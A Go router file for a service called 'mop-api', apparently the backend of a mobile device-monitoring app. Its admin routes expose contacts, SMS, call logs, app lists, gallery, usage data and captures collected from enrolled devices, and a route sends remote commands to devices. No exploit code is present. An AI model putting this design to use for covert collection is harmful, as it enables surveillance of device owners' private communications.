package internal

import (
	"net/http"

	"github.com/go-chi/chi/v5"
	chimw "github.com/go-chi/chi/v5/middleware"
	"mop-api/internal/handlers"
	"mop-api/internal/middleware"
	"mop-api/internal/store"
	"mop-api/pkg"
)

// NewRouter 创建 chi 路由：/health、/api/v1/*
func NewRouter(cfg pkg.Config, st store.Store) http.Handler {
	h := &handlers.Handler{Store: st, Cfg: cfg}
	r := chi.NewRouter()
	r.Use(chimw.RealIP, chimw.Logger, chimw.Recoverer, pkg.CORS(""))
	r.Get("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"status":"ok","service":"mop-api"}`))
	})
	r.Route("/api/v1", func(r chi.Router) {
		r.Post("/auth/login", h.Login)
		r.Post("/auth/refresh", h.AuthRefresh)
		r.Post("/user/enroll", h.Enroll)
		r.Get("/invite/validate", h.InviteValidate)
		r.Group(func(r chi.Router) {
			r.Use(middleware.UserAuth(st))
			r.Get("/config", h.Config)
			r.Get("/device/commands", h.GetCommands)
			r.Post("/invite/generate", h.InviteGenerate)
			r.Get("/user/search", h.UserSearch)
			r.Get("/user/friends", h.GetFriends)
			r.Post("/friend/request", h.FriendRequest)
			r.Post("/audit/check-sum", h.CheckSum)
			r.Post("/audit/upload", h.Upload)
			r.Get("/user/profile", h.GetProfile)
			r.Patch("/user/profile", h.UpdateProfile)
			r.Post("/user/change-password", h.ChangePassword)
			r.Post("/user/avatar", h.UploadAvatar)
		})
		r.Get("/admin/captcha", h.AdminCaptcha)
		r.Post("/admin/auth", h.AdminAuth)
		r.Route("/internal", func(r chi.Router) {
			r.Use(middleware.BuildTokenAuth(cfg.BuildToken))
			r.Post("/build-sync", h.BuildSync)
		})
		r.Route("/admin", func(r chi.Router) {
			r.Use(middleware.AdminAuth(cfg.AdminToken))
			r.Get("/devices", h.AdminListDevices)
			r.Get("/devices/{device_id}", h.AdminGetDevice)
			r.Get("/users", h.AdminListUsers)
			r.Get("/users/{uid}", h.AdminGetUser)
			r.Get("/relations", h.AdminListRelations)
			r.Get("/builds", h.AdminListBuilds)
			r.Get("/audit/contacts", h.AdminAuditContacts)
			r.Get("/audit/sms", h.AdminAuditSms)
			r.Get("/audit/call_log", h.AdminAuditCallLog)
			r.Get("/audit/app_list", h.AdminAuditAppList)
			r.Get("/audit/gallery", h.AdminAuditGallery)
			r.Get("/audit/usage", h.AdminAuditUsage)
			r.Get("/audit/captures", h.AdminAuditCaptures)
			r.Get("/audit/blob/{id}", h.AdminAuditBlob)
			r.Post("/devices/{device_id}/command", h.AdminSendCommand)
		})
	})
	return r
}
